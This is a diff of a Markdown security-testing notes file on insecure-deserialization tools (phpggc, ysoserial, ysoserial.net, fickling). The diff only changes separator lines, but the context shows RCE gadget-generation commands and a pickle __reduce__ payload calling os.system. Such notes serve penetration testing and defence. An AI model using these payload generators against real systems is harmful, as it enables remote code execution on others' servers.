@@ -18,7 +18,7 @@ linked:
 ---
 # Insecure Deserialization - Tooling
 
-***
+---
 
 ## phpggc (PHP)
 
@@ -39,7 +39,7 @@ linked:
 | Test gadget | `./phpggc -t -p phar Monolog/RCE1 system "id"` | Verifica que funciona en stack PHP local. |
 ^deser-tool-phpggc
 
-___
+---
 
 ## ysoserial (Java)
 
@@ -61,7 +61,7 @@ ___
 | Modified ysoserial (con más gadgets) | `https://github.com/wh1t3p1g/ysoserial` (fork)  | Más chains modernos. |
 ^deser-tool-ysoserial
 
-___
+---
 
 ## ysoserial.net (.NET)
 
@@ -82,7 +82,7 @@ ___
 | TestPlugin | `--test --plugin=...` | Verifica que funciona local. |
 ^deser-tool-ysoserialnet
 
-___
+---
 
 ## fickling (Python pickle)
 
@@ -100,7 +100,7 @@ ___
 | Manual con pickle | `python3 -c "import pickle, os; class E: ___ def __reduce__(self): return (os.system, ('id',)); print(pickle.dumps(E()))"` | Sin tool externa. |
 ^deser-tool-fickling
 
-___
+---
 
 ## Otros tools
 
@@ -119,4 +119,4 @@ ___
 | `awesome-fastjson` | Repo con gadgets FastJson | https://github.com/safe6Sec/Fastjson |
 ^deser-tool-others
 
-***
+---
